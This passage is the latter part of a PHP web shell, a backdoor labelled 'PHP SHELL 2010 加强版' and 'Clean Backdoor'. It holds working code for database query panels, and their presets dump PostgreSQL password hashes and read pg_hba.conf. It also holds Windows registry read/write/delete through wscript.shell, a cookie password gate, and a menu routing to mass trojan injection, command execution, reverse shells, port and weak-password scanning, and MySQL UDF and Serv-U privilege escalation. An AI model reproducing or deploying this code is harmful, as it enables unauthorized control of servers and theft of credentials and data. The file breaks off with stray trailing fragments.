$_POST['db2pass'] : '123456'; $db2dbname = isset($_POST['db2dbname']) ? $_POST['db2dbname'] : 'mysql'; $db2action = isset($_POST['action']) ? $_POST['action'] : ''; $db2query = isset($_POST['db2sql']) ? $_POST['db2sql'] : ''; $db2query = stripslashes($db2query); print<<<END
<form method="POST" name="db2form" action="?s=w&db=db2">
<div class="actall">主机:<input type="text" name="db2host" value="{$db2host}" style="width:100px">
端口:<input type="text" name="db2port" value="{$db2port}" style="width:60px">
用户:<input type="text" name="db2user" value="{$db2user}" style="width:100px">
密码:<input type="text" name="db2pass" value="{$db2pass}" style="width:100px">
数据库名:<input type="text" name="db2dbname" value="{$db2dbname}" style="width:100px"><br><br>
<script language="javascript">
function db2Full(i){
	Str = new Array(4);
        Str[0] = "";
	Str[1] = "select schemaname from syscat.schemata;";
        Str[2] = "select name from sysibm.systables;";
        Str[3] = "select colname from syscat.columns where tabname='table_name';";
        Str[4] = "db2 get db cfg for db_name;";
	db2form.db2sql.value = Str[i];
	return true;
}
</script>
<textarea name="db2sql" style="width:600px;height:200px;">{$db2query}</textarea><br>
<select onchange="return db2Full(options[selectedIndex].value)">
	<option value="0" selected>command</option>
        <option value="1">databases</option>
        <option value="1">tables</option>
        <option value="2">columns</option>
        <option value="3">db config</option>
</select>
<input type="hidden" name="action" value="db2query">
<input class="bt" type="submit" value="执行"></div></form>
END;
if ($myaction == 'db2query'){ $db2link = db2_connect($db2dbname, $db2user, $db2pass) or die(db2_conn_errormsg()); $db2result = db2_exec($db2link,$db2query) or die(db2_stmt_errormsg()); $db2row=db2_fetch_row($db2result); echo '<font face="verdana">'; echo '<table border="1" cellpadding="1" cellspacing="2">'; echo "\n<tr>\n"; for ($i=0; $i<db2_num_fields($db2result); $i++) { echo '<td bgcolor="#228B22"><b>'. db2_field_name($db2result); echo "</b></td>\n"; } echo "</tr>\n"; while ($db2row=db2_fetch_row($db2result)) { echo "<tr>\n"; for ($i=0; $i<db2_num_fields($db2result); $i++ ) { echo '<td bgcolor="#B8B8E8">'; echo "$db2row[$i]"; echo '</td>'; } echo "</tr>\n"; } echo "</table>\n"; echo "</font>"; db2_free_result($db2result); db2_close(); } } elseif($db == "fb") { $fbhost = isset($_POST['fbhost']) ? $_POST['fbhost'] : 'localhost'; $fbpath = isset($_POST['fbpath']) ? $_POST['fbpath'] : ''; $fbpath = str_replace("\\\\", "\\", $fbpath); $fbuser = isset($_POST['fbuser']) ? $_POST['fbuser'] : 'sysdba'; $fbpass = isset($_POST['fbpass']) ? $_POST['fbpass'] : 'masterkey'; $fbaction = isset($_POST['action']) ? $_POST['action'] : ''; $fbquery = isset($_POST['fbsql']) ? $_POST['fbsql'] : ''; $fbquery = stripslashes($fbquery); print<<<END
<form method="POST" name="fbform" action="?s=w&db=fb">
<div class="actall">主机:<input type="text" name="fbhost" value="{$fbhost}" style="width:100px">
路径:<input type="text" name="fbpath" value="{$fbpath}" style="width:100px">
用户:<input type="text" name="fbuser" value="{$fbuser}" style="width:100px">
密码:<input type="text" name="fbpass" value="{$fbpass}" style="width:100px"><br/>
<script language="javascript">
function fbFull(i){
	Str = new Array(5);
        Str[0] = "";
	Str[1] = "select RDB\$RELATION_NAME from RDB\$RELATIONS;";
        Str[2] = "select RDB\$FIELD_NAME from RDB\$RELATION_FIELDS where RDB\$RELATION_NAME='table_name';";
        Str[3] = "input 'D:\\createtable.sql';";
        Str[4] = "shell netstat -an;";
	fbform.fbsql.value = Str[i];
	return true;
}
</script>
<textarea name="fbsql" style="width:600px;height:200px;">{$fbquery}</textarea><br>
<select onchange="return fbFull(options[selectedIndex].value)">
	<option value="0" selected>command</option>
        <option value="1">tables</option>
        <option value="2">columns</option>
        <option value="3">import sql</option>
        <option value="4">shell</option>
</select>
<input type="hidden" name="action" value="fbquery">
<input class="bt" type="submit" value="执行"></div></form>
END;
if ($fbaction == 'fbquery'){ $fblink = ibase_connect($fbhost.':'.$fbpath,$fbuser,$fbpass) or die(ibase_errmsg()); $fbresult = ibase_query($fblink,$fbquery) or die(ibase_errmsg()); echo '<font face="verdana">'; echo '<table border="1" cellpadding="1" cellspacing="2">'; echo "\n<tr>\n"; for ($i=0; $i<ibase_num_fields($fbresult); $i++) { echo '<td bgcolor="#228B22"><b>'. ibase_field_info($fbresult, $i); echo "</b></td>\n"; } echo "</tr>\n"; ibase_field_info($fbresult, 0); while ($fbrow=ibase_fetch_row($fbresult)) { echo "<tr>\n"; for ($i=0; $i<ibase_num_fields($fbresult); $i++ ) { echo '<td bgcolor="#B8B8E8">'; echo "$fbrow[$i]"; echo '</td>'; } echo "</tr>\n"; } echo "</table>\n"; echo "</font>"; ibase_free_result($fbresult); ibase_close(); } } else{ $pghost = isset($_POST['pghost']) ? $_POST['pghost'] : 'localhost'; $pguser = isset($_POST['pguser']) ? $_POST['pguser'] : 'postgres'; $pgpass = isset($_POST['pgpass']) ? $_POST['pgpass'] : ''; $pgdbname = isset($_POST['pgdbname']) ? $_POST['pgdbname'] : 'postgres'; $pgaction = isset($_POST['action']) ? $_POST['action'] : ''; $pgquery = isset($_POST['pgsql']) ? $_POST['pgsql'] : ''; $pgquery = stripslashes($pgquery); print<<<END
<form method="POST" name="pgform" action="?s=w">
<div class="actall">主机:<input type="text" name="pghost" value="{$pghost}" style="width:100px;">
用户:<input type="text" name="pguser" vaule="{$pguser}" style="width:100px">
密码:<input tyoe="text" name="pgpass" value="{$pgpass}" style="width:100px">
数据库名:<input type="text" name="pgdbname" value="{$pgdbname}" style="width:100px"><br><br>
<script language="javascript">
function pgFull(i){
	Str = new Array(7);
	Str[0] = "";
        Str[1] = "select version();";
        Str[2] = "select datname from pg_database;";
        Str[3] = "select relname from pg_stat_user_tables limit 1 offset n;";
        Str[4] = "select column_name from information_schema.columns where table_name='xxx' limit 1 offset n;";
        Str[5] = "select usename,passwd from pg_shadow;";
	Str[6] = "select pg_file_read('pg_hba.conf',1,pg_file_length('pg_hb.conf'));";
	pgform.pgsql.value = Str[i];
	return true;
}
</script>
<textarea name="pgsql" style="width:600px;height:200px;">{$pgquery}</textarea><br>
<select onchange="return pgFull(options[selectedIndex].value)">
	<option value="0" selected>command</option>
        <option value="1">version</option>
        <option value="2">databases</option>
        <option value="3">tables</option>
        <option value="4">columns</option>
        <option value="5">hashes</option>
	<option value="6">pg_hb.conf</option>
</select>
<input type="hidden" name="action" value="pgquery">
<input class="bt" type="submit" value="执行"></div></form>
END;
if ($pgaction == 'pgquery'){ $pgconn = pg_connect("host=$pghost dbname=$pgdbname user=$pguser password=$pgpass ") or die( '不能连接: ' . pg_last_error()); $pgresult = pg_query($pgquery) or die( '执行失败: '.pg_last_error()); $pgrow=pg_fetch_row($pgresult); echo '<font face="verdana">'; echo '<table border="1" cellpadding="1" cellspacing="2">'; echo "\n<tr>\n"; for ($i=0; $i<pg_num_fields($pgresult); $i++) { echo '<td bgcolor="#228B22"><b>'. pg_field_name($pgresult, $i); echo "</b></td>\n"; } echo "</tr>\n"; pg_result_seek($pgresult, 0); while ($pgrow=pg_fetch_row($pgresult)) { echo "<tr>\n"; for ($i=0; $i<pg_num_fields($pgresult); $i++ ) { echo '<td bgcolor="#B8B8E8">'; echo "$pgrow[$i]"; echo '</td>'; } echo "</tr>\n"; } echo "</table>\n"; echo "</font>"; pg_free_result($pgresult); pg_close(); } } } function phpreg(){ $shell1 = new COM("wscript.shell") or die("必须是 windows 主机"); $action = isset($_POST['action']) ? $_POST['action'] : ''; echo '<br>'; echo '<div class="actall"><h5>读 & 写 &删除 注册表</h5><br></div>'; echo '<br>'; print<<<END
<TR><form   action=""   method="post">   
<div class="actall"><TD WIDTH=100 VALIGN=TOP ALIGN=CENTER>   
读取路径:&nbsp<input type="hidden" name="action" value="read">   
<input type="text" name="rpath" value="{$rpath}" size="70">   
<input class="bt" type="submit" value="读操作"></form></TD></TR><br><br></div>   
END;
$rpath = isset($_POST['rpath']) ? $_POST['rpath'] : ''; $rpath = str_replace("\\\\", "\\", $rpath); if ($action=="read"){ $out = $shell1->RegRead($rpath); echo '<pre>'.var_dump($out).'</pre>'; echo '<br><br>'; } print<<<END
<TR><form   action=""   method="post">   
<div class="actall"><TD WIDTH=100 VALIGN=TOP ALIGN=CENTER>Wpath:      
<input type="text" name="wpath" value="{$wpath}" size="70"><BR><br> 
写类型:&nbsp<input type="text" name="wtype" value="{$wtype}" size="20">
写键值:&nbsp<input type="text" name="wvalue" value="{$wvalue}" size="30">
<input type="hidden" name="action" value="write">  
<input class="bt" type="submit" value="写操作"></form></TD></TR><br><br><br></div>   
END;
$wpath = isset($_POST['wpath']) ? $_POST['wpath'] : ''; $wpath = str_replace("\\\\", "\\", $wpath); $wtype = isset($_POST['wtype']) ? $_POST['wtype'] : ''; $wvalue = isset($_POST['wvalue']) ? $_POST['wvalue'] : ''; if ($action=="write"){ $shell1->RegWrite($wpath, $wvalue, $wtype); } print<<<END
<TR><form   action=""   method="post">   
<div class="actall"><TD WIDTH=100 VALIGN=TOP ALIGN=CENTER>  
删除路径:<input type="hidden" name="action" value="del">   
<input type="text" name="dpath" value="{$dpath}" size="70">   
<input class="bt" type="submit" value="删除"></form></TD></TR><br><br></div>   
END;
$dpath = isset($_POST['dpath']) ? $_POST['dpath'] : ''; $dpath = str_replace("\\\\", "\\", $dpath); if ($action=="del"){ $out = $shell1->RegDelete($dpath); } } function Root_Login($MSG_TOP) { global $lanip; print<<<END

<html>
	<body style="background:#FFFFF;">
		<center>
		<form method="POST">
		<div style="width:551px;height:201px;margin-top:100px;background:threedface;border-color: #000000 #999999 #FFFFF;border-style:solid;border-width:1px;">
		<div style="width:550px;height:22px;padding-top:2px;color:#FFFFFF;background:#000000;clear:both;"><b>{$MSG_TOP}</b></div>
		<div style="width:550px;height:80px;padding-top:30px;color:;clear:both;">密码:<input type="password" name="b4che10rpass" style="width:200px;height:20px"></div>
		<div style="width:550px;height:50px;clear:both;"><input class="bt" type="submit" value="login"></div>
                <h5>@Copyright spider Clean Backdoor加强版 by：筱豪 && L.N.<h5>
                <h5>Your IP : {$lanip} <h5>
		</div>
		</form>
		</center>
	</body>
</html>
END;
return false; } function WinMain() { $Server_IP = gethostbyname($_SERVER["SERVER_NAME"]); $Server_OS = PHP_OS; $Server_Soft = $_SERVER["SERVER_SOFTWARE"]; print<<<END
<html>
	<title> PHP SHELL 2010 加强版 by:筱豪 && L.N. </title>
	<head>
		<style type="text/css">
			*{padding:0; margin:0;}
			body{background:#FFFFF;font-family:"Verdana", "Tahoma", sans-serif; font-size:13px;margin:0 auto; text-align:center;margin-top:5px;word-break:break-all;}
			.outtable {height:600px;width:%90;color:#000000;border-top-width: 2px;border-right-width: 2px;border-bottom-width: 2px;border-left-width: 2px;border-top-style: outset;border-right-style: outset;border-bottom-style: outset;border-left-style: outset;border-top-color: #FFFFFF;border-right-color: #8c8c8c;border-bottom-color: #8c8c8c;border-left-color: #FFFFFF;background-color: threedface;}
			.topbg {padding-top:3px;text-align: left;font-size:12px;font-weight: bold;height:22px;width:950px;color:#FFFFFF;background: #293F5F;}
			.bottombg {padding-top:3px;text-align: center;font-size:12px;font-weight: bold;height:22px;width:950px;color:#000000;background: #888888;}
			.listbg {font-family:'lucida grande',tahoma,helvetica,arial,'bitstream vera sans',sans-serif;font-size:13px;width:130px;}
			.listbg li{padding:3px;color:#000000;height:25px;display:block;line-height:26px;text-indent:0px;}
			.listbg li a{padding-top:2px;background:#BBBBBB;color:#000000;height:25px;display:block;line-height:24px;text-indent:0px;border-color:#999999 #999999 #999999 #999999;border-style:solid;border-width:1px;text-decoration:none;}
		</style>
		<script language="JavaScript">
			function switchTab(tabid)
			{
				if(tabid == '') return false;
				for(var i=0;i<=17;i++)
				{
					if(tabid == 't_'+i) document.getElementById(tabid).style.background="#FFFFFF";
					else document.getElementById('t_'+i).style.background="#BBBBBB";
				}
				return true;
			}
		</script>
	</head>
	<body>
		<div class="outtable">
		<div class="topbg"> &nbsp; {$Server_IP} - {$Server_OS} </div>
			<div style="height:546px;">
				<table width="100%" height="100%" border=0 cellpadding="0" cellspacing="0">
				<tr>
				<td width="140" align="center" valign="top">
					<ul class="listbg">
						<li><a href="?s=a" id="t_0" onclick="switchTab('t_0')" style="background:#FFFFFF;" target="main"> 文件管理 </a></li>
						<li><a href="?s=b" id="t_1" onclick="switchTab('t_1')" target="main"> 批量挂马 </a></li>
						<li><a href="?s=c" id="t_2" onclick="switchTab('t_2')" target="main"> 批量清马</a></li>
						<li><a href="?s=d" id="t_3" onclick="switchTab('t_3')" target="main"> 批量替换 </a></li>
						<li><a href="?s=e" id="t_4" onclick="switchTab('t_4')" target="main"> 扫描木马 </a></li>
                                                <li><a href="?s=u" id="t_21" onclick="switchTab('t_21')" target="main"> 搜索文件</a></li>
                                                <li><a href="?s=v" id="t_22" onclick="switchTab('t_22')" target="main"> FTP连接</a></li>
						<li><a href="?s=f" id="t_5" onclick="switchTab('t_5')" target="main"> 系统信息 </a></li>
						<li><a href="?s=g" id="t_6" onclick="switchTab('t_6')" target="main"> CMD命令 </a></li>
						<li><a href="?s=h" id="t_7" onclick="switchTab('t_7')" target="main"> 组建接口 </a></li>
						<li><a href="?s=i" id="t_8" onclick="switchTab('t_8')" target="main"> 端口扫描 </a></li>
						<li><a href="?s=j" id="t_9" onclick="switchTab('t_9')" target="main"> 转换Shellcode </a></li>
						<li><a href="?s=k" id="t_10" onclick="switchTab('t_10')" target="main"> 弱口令扫描 </a></li>
						<li><a href="?s=l" id="t_11" onclick="switchTab('t_11')" target="main">Linux 反弹 </a></li>
                                                <li><a href="?s=r" id="t_12" onclick="switchTab('t_12')" target="main">PHP 反弹 </a></li>
						<li><a href="?s=m" id="t_13" onclick="switchTab('t_13')" target="main"> Mysql_UDF提权 </a></li>
						<li><a href="?s=n" id="t_14" onclick="switchTab('t_14')" target="main"> Mysql语句执行 </a></li>
                                                <li><a href="?s=o" id="t_15" onclick="switchTab('t_15')" target="main">注册表操作 </a></li>
                                                <li><a href="?s=z" id="t_16" onclick="switchTab('t_16')" target="main">Serv-U提权 </a></li>
                                                <li><a href="?s=x" id="t_17" onclick="switchTab('t_17')" target="main">执行PHP代码 </a></li>
                                                <li><a href="?s=w" id="t_18" onclick="switchTab('t_18')" target="main">其他数据库操作 </a></li>
						<li><a href="?s=logout" id="t_20" onclick="switchTab('t_20')"> 退 出 </a></li>
					</ul>
				</td>
				<td>
				<iframe name="main" src="?s=a" width="100%" height="100%" frameborder="0"></iframe>
				</td>
				</tr>
				</table>
			</div>
		<div class="bottombg"> {$Server_Soft} </div>
		</div>
	</body>
</html>
END;
return false; } if(get_magic_quotes_gpc()) { $_GET = Root_GP($_GET); $_POST = Root_GP($_POST); } if($_GET['s'] == 'logout') { setcookie('admin_b4che10rpass',NULL); die('<meta http-equiv="refresh" content="0;URL=?">'); } if($_COOKIE['admin_b4che10rpass'] != md5($password)) { ob_start(); $MSG_TOP = 'PHP shell加强版 '; if(isset($_POST['b4che10rpass'])) { $cookietime = time() + 24 * 3600; setcookie('admin_b4che10rpass',md5($_POST['b4che10rpass']),$cookietime); if(md5($_POST['b4che10rpass']) == md5($password)){die('<meta http-equiv="refresh" content="1;URL=?">');} else{$MSG_TOP = '密码错误';} } Root_Login($MSG_TOP); exit(); ob_end_flush(); } if(isset($_GET['s'])){$s = $_GET['s'];if($s != 'a' && $s != 'n')Root_CSS();}else{$s = 'MyNameIsHacker';} $p = isset($_GET['p']) ? $_GET['p'] : File_Str(dirname(__FILE__)); switch($s) { case "a" : File_a($p); break; case "b" : Guama_b(); break; case "c" : Qingma_c(); break; case "d" : Tihuan_d(); break; case "e" : Antivirus_e(); break; case "f" : Info_f(); break; case "g" : Exec_g(); break; case "h" : Com_h(); break; case "i" : Port_i(); break; case "j" : Shellcode_j(); break; case "k" : Crack_k(); break; case "l" : Linux_l(); break; case "m" : Mysql_m(); break; case "n" : Mysql_n(); break; case "o" : phpreg(); break; case "p" : File_Edit($_GET['fp'],$_GET['fn']); break; case 'x' : phpcode();break; case 'r' : phpsocket();break; case 'w' : otherdb();break; case 'z' : su();break; case 'u' : Findfile_j(); break; case 'v' : ftp_php();break; default: WinMain(); break; } ?>ak; } ?>
